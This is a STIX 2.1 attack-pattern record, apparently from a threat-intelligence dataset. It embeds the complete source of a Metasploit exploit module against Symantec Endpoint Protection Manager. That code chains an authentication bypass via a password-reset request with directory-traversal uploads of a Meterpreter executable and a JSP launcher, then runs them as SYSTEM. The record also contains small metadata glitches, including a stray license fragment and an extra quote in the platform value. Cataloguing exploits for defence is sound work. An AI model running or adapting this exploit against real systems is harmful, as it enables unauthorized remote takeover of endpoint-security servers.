{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8cb7a9b-6d02-40b0-9039-d67b714e9817",
    "created": "2024-08-14T16:53:37.032517Z",
    "modified": "2024-08-14T16:53:37.032522Z",
    "name": "Symantec Endpoint Protection Manager Authentication Bypass and Code Execution",
    "description": " This module exploits three separate vulnerabilities in Symantec Endpoint Protection Manager in order to achieve a remote shell on the box as NT AUTHORITY\\SYSTEM. The vulnerabilities include an authentication bypass, a directory traversal and a privilege escalation to get privileged code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sepm_auth_bypass_rce.rb",
            "external_id": "sepm_auth_bypass_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1486"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1487"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1489"
        },
        {
            "source_name": "reference",
            "url": "http://codewhitesec.blogspot.com/2015/07/symantec-endpoint-protection.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Symantec Endpoint Protection Manager Authentication Bypass and Code Execution',\n      'Description'    => %q{\n        This module exploits three separate vulnerabilities in Symantec Endpoint Protection Manager\n        in order to achieve a remote shell on the box as NT AUTHORITY\\SYSTEM. The vulnerabilities\n        include an authentication bypass, a directory traversal and a privilege escalation to\n        get privileged code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Markus Wulftange', #discovery\n          'bperry' # metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-1486'],\n          ['CVE', '2015-1487'],\n          ['CVE', '2015-1489'],\n          ['URL', 'http://codewhitesec.blogspot.com/2015/07/symantec-endpoint-protection.html']\n        ],\n      'DefaultOptions' => {\n        'SSL' => true\n      },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic',\n            {\n              'Arch' => ARCH_X86,\n              'Payload' => {\n                'DisableNops' => true\n              }\n            }\n          ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2015-07-31',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8443),\n          OptString.new('TARGETURI', [true, 'The path of the web application', '/']),\n        ])\n  end\n\n  def exploit\n    meterp = Rex::Text.rand_text_alpha(10)\n    jsp = Rex::Text.rand_text_alpha(10)\n\n    print_status(\"Getting cookie...\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'servlet', 'ConsoleServlet'),\n      'method' => 'POST',\n      'vars_post' => {\n        'ActionType' => 'ResetPassword',\n        'UserID' => 'admin',\n        'Domain' => ''\n      }\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - The server did not respond in an expected way\")\n    end\n\n    cookie = res.get_cookies\n\n    if cookie.nil? || cookie.empty?\n      fail_with(Failure::Unknown, \"#{peer} - The server did not return a cookie\")\n    end\n\n    exec = %Q{<%@page import=\"java.io.*,java.util.*,com.sygate.scm.server.util.*\"%>\n<%=SemLaunchService.getInstance().execute(\"CommonCMD\", Arrays.asList(\"/c\", System.getProperty(\"user.dir\")+\"\\\\\\\\..\\\\\\\\webapps\\\\\\\\ROOT\\\\\\\\#{meterp}.exe\")) %>\n    }\n\n    print_status(\"Uploading payload...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'servlet', 'ConsoleServlet'),\n      'method' => 'POST',\n      'vars_get' => {\n        'ActionType' => 'BinaryFile',\n        'Action' => 'UploadPackage',\n        'PackageFile' => \"../../../tomcat/webapps/ROOT/#{meterp}.exe\",\n        'KnownHosts' => '.'\n      },\n      'data' => payload.encoded_exe,\n      'cookie' => cookie,\n      'ctype' => ''\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Server did not respond in an expected way\")\n    end\n\n    register_file_for_cleanup(\"../tomcat/webapps/ROOT/#{meterp}.exe\")\n\n    print_status(\"Uploading JSP page to execute the payload...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'servlet', 'ConsoleServlet'),\n      'method' => 'POST',\n      'vars_get' => {\n        'ActionType' => 'BinaryFile',\n        'Action' => 'UploadPackage',\n        'PackageFile' => \"../../../tomcat/webapps/ROOT/#{jsp}.jsp\",\n        'KnownHosts' => '.'\n      },\n      'data' => exec,\n      'cookie' => cookie,\n      'ctype' => ''\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Server did not respond in an expected way\")\n    end\n\n    register_file_for_cleanup(\"../tomcat/webapps/ROOT/#{jsp}.jsp\")\n\n    print_status(\"Executing payload. Manual cleanup will be required.\")\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"#{jsp}.jsp\")\n    }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-31",
    "x_mitre_platforms": [
        "win'"
    ]
}